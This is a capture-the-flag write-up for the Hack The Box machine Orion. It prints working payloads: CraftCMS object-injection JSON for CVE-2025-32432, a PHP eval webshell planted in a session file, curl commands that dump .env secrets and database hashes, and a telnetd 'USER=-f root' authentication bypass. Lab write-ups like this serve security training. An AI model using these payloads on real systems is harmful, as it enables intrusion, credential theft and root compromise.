# HTB — Orion

| | |
|---|---|
| **Difficulty** | Very Easy |
| **OS** | Linux (Ubuntu 22.04) |
| **Skills** | Web enumeration, CSRF bypass, Yii/CraftCMS object-injection RCE, Linux privesc |

## Overview

Orion chains a CSRF-protected preauth RCE in CraftCMS (CVE-2025-32432) with credential
exposure via a Craft `.env` file, password reuse into SSH, and a telnetd authentication
bypass (CVE-2026-24061) for root.

## Recon

```bash
nmap -sCV 10.129.69.96
```

- `22/tcp` — OpenSSH 8.9p1
- `80/tcp` — nginx 1.18.0, redirects to `orion.htb`

```bash
echo "10.129.69.96 orion.htb" | sudo tee -a /etc/hosts
```

Site footer: "Powered by CraftCMS." `/admin/login` leaked version **5.6.16**, vulnerable
to CVE-2025-32432.

## Foothold — CVE-2025-32432

### 1. Manual CSRF bypass + RCE confirmation

Craft/Yii ties CSRF validation to session state. Required cookies/token:

```bash
curl -s -c cookies.txt http://orion.htb/admin/login -o login.html
grep -o 'csrfTokenValue[^,]*' login.html
cat cookies.txt   # CraftSessionId, CRAFT_CSRF_TOKEN
```

Payload exploiting Yii's `as <name>` behavior-attach mechanism to instantiate an
arbitrary class (`GuzzleHttp\Psr7\FnStream`, whose `_fn_close` runs on destruct):

```json
{
  "assetId": 1,
  "handle": {
    "width": 123, "height": 123,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "GuzzleHttp\\Psr7\\FnStream",
      "__construct()": [[]],
      "_fn_close": "phpinfo"
    }
  }
}
```

```bash
curl -s -b cookies.txt \
  -H "X-CSRF-Token: <token>" \
  -H "Content-Type: application/json" \
  -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform" \
  -d @payload.json -o response.html
grep -i "PHP Version" response.html   # confirms execution
```

### 2. Metasploit module — gotchas

`exploit/linux/http/craftcms_preauth_rce_cve_2025_32432` requires `VHOST orion.htb`
explicitly (nginx routes by hostname; without it the module hits the wrong vhost and
can't find the CSRF token). Even after fixing that, the reverse-shell handler
consistently failed to receive a callback despite `tcpdump` confirming SYNs arrived and
`iptables`/`ss` confirming the listener was correctly bound — root cause not fully
isolated. Pivoted to a manual, listener-free RCE technique instead.

### 3. Manual RCE without a reverse shell

Poison a session file with a webshell:

```bash
curl -g -s -c webshell_cookies.txt \
  "http://orion.htb/index.php?p=admin/dashboard&a=<?=eval(\$_GET['cmd']);die()?>" \
  -o /dev/null -D -
```

Trigger it via the CSRF-bypass endpoint, loading `yii\rbac\PhpManager` with
`itemFile` pointed at the poisoned session (`init()` → `require($itemFile)`):

```json
{
  "assetId": 1,
  "handle": {
    "width": 123, "height": 123,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "yii\\rbac\\PhpManager",
      "__construct()": [{"itemFile": "/var/lib/php/sessions/sess_<id>"}]
    }
  }
}
```

```bash
curl -g -s -b cookies.txt \
  -H "X-CSRF-Token: <token>" \
  -H "Content-Type: application/json" \
  -X POST 'http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=system("id");' \
  -d @payload2.json -o response.html
```

> **Notes:**
> - `cmd` must be a PHP statement (`eval($_GET['cmd'])` expects PHP, not shell).
> - curl's strict URL parser rejects literal spaces — use `%20` or base64-encode complex commands.

## Credential Access

```bash
# Craft .env is world-readable to www-data
# via RCE: cmd=system("cat%20/var/www/html/craft/.env");
# → CRAFT_DB_USER=root, CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

MySQL bound to `127.0.0.1` only — queried through RCE using base64-encoded PHP to
avoid shell quoting issues:

```bash
B64=$(base64 -w0 <<< "system('mysql -u root -pSuperSecureCraft123Pass! orion -e \"select username, email, password from users;\" 2>&1');" | sed 's/+/%2B/g')

curl -g -s -b cookies.txt \
  -H "X-CSRF-Token: <token>" \
  -H "Content-Type: application/json" \
  -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=eval(base64_decode('$B64'));" \
  -d @payload2.json -o response.html
```

Retrieved bcrypt hash for `adam@orion.htb`.

## Cracking

`hashcat -m 3200` failed — no OpenCL device in this VM (`clinfo` showed rusticl with
0 devices). Used John instead:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# cracked in ~19s
```

## User Access

Password reuse:

```bash
ssh adam@orion.htb
cat user.txt   # <redacted>
```

## Privilege Escalation — CVE-2026-24061

```bash
netstat -tulnp     # telnet on 127.0.0.1:23
telnet --version   # GNU inetutils 2.7
```

`USER` env var passed unsanitized to `login(1)`; `-f root` bypasses authentication:

```bash
USER="-f root" telnet -a 127.0.0.1
cat /root/root.txt   # <redacted>
```

## References

- [CVE-2025-32432](https://www.exploit-db.com/) — CraftCMS preauth RCE
- [CVE-2026-24061](https://nvd.nist.gov/) — GNU inetutils telnetd auth bypass
